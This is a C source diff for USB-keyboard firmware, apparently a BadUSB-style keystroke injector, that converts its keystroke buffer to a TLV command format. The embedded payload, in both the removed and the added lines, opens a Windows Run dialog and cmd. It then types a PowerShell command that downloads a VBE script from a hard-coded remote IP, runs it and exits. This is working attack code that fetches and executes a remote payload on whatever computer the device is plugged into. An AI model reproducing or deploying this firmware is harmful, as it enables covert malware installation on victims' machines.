@@ -34,12 +34,66 @@ struct system_config
 	uint32_t delay_count;
 };
 
-char *key_buffer[4] = {
+struct tlv {
+	uint8_t tag;
+	uint8_t len;
+	uint8_t value[1];
+};
+
+enum command_tag {
+	STRING      = 1,
+	DELAY	      = 2,
+	SPECIAL_KEY = 3,	/* keyboard input report description */
+};
+
+char *cmd_buffer[2] = {
 	/* this memory use as system config */
-	"\xef\xbe\xad\xde\xe0\x93\x04\x00\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
-	"powershell (New-Object \"System.Net.WebClient\").DownloadFile('http://123.56.12.242:8421/test.vbe', 'D:\\test.vbe')\n\0\0\0\0\0\0\0\0\0\0\0\0",
-	"D:\\test.vbe\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
-	"exit\n\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
+"\xef\xbe\xad\xde\x40\x42\x0F\x00\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0",
+/*
+	\x03 [Buffer_Win]
+	\x03 [Buffer_Win_R]
+	\x03 [Buffer_Win]
+	\x03 [Buffer_release]
+	\x01 [cmd\n\n]
+	\x03 [Buffer_Shift]
+	\x03 [Buffer_release]
+	\x02 [Delay 1000000]
+	now the cmd window open
+	*/
+"\
+\x03\x08\x08\x00\x00\x00\x00\x00\x00\x00\
+\x03\x08\x08\x00\x15\x00\x00\x00\x00\x00\
+\x03\x08\x08\x00\x00\x00\x00\x00\x00\x00\
+\x03\x08\x00\x00\x00\x00\x00\x00\x00\x00\
+\x01\x07 cmd\n\n\0\
+\x03\x08\x02\x00\x00\x00\x00\x00\x00\x00\
+\x03\x08\x00\x00\x00\x00\x00\x00\x00\x00\
+\x02\x04\x40\x42\x0F\x00\
+\
+\x01\x73 powershell (New-Object \"System.Net.WebClient\").DownloadFile('http://123.56.12.242:8421/test.vbe', 'D:\\test.vbe')\n\0\
+\x01\x0e D:\\test.vbe\n\0\
+\x01\x07 exit\n\0\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+\x00\x00\x00\x00\x00\x00\x00\x00\
+",
 };
 
 u8 Buffer_Shift[8]   = {0x2, 0, 0, 0, 0, 0, 0, 0}; //Keyboard Shift
@@ -319,7 +373,7 @@ void delay(uint32_t t)
 
 void __keyboard_send(u8 *Buffer)
 {
-		struct system_config *sc = (struct system_config *)(key_buffer[0]);
+		struct system_config *sc = (struct system_config *)(cmd_buffer[0]);
 		//printf("%d %d"), sc->delay_count;
 		//return;
 		/*copy mouse position info in ENDP1 Tx Packet Memory Area*/
@@ -439,8 +493,9 @@ void __local_irq_enable(void)
 
 int main(void)
 {
-	uint32_t i;
 
+	struct tlv *ptlv;
+	
 #ifdef DEBUG
   debug();
 #endif
@@ -485,6 +540,7 @@ int main(void)
   while (1)
   {
     Delay(10000);
+#if 0
 		__keyboard_send(Buffer_Win);
 
 		__keyboard_send(Buffer_Win_R);
@@ -501,14 +557,43 @@ int main(void)
 		__keyboard_send(Buffer_Shift);
 		__keyboard_send(buffer_release);
 		Delay(1000000);
+#endif
+
 		/****************************************************/
-		
+#if 0
+		uint32_t i;		
 		for(i = 1; i < 4; i++) {
 			if (strlen(key_buffer[i]) != 0) {
 				keyboard_send_string(key_buffer[i]);
 			}
 		}
-
+#endif
+		
+		/* process the tlv format cmd */
+		ptlv = (struct tlv *)cmd_buffer[1];
+		
+		while(ptlv->tag != 0) {	/* 0 == '\0' */
+			switch (ptlv->tag) {
+				case (STRING): /* normal string */
+					keyboard_send_string((char *)(&(ptlv->value[0])));
+					break;
+				case (DELAY):
+					if (ptlv->len == 4) {
+							Delay(readl(&ptlv->value[0]));
+					}
+					break;
+				case (SPECIAL_KEY):
+					if (ptlv->len == 8) {
+							__keyboard_send((u8 *)(&ptlv->value[0]));
+					}
+					break;
+				default:
+					break;
+			}
+			
+			ptlv = (struct tlv *)(&ptlv->value[ptlv->len]);
+		}
+		
 		break;
   }
 
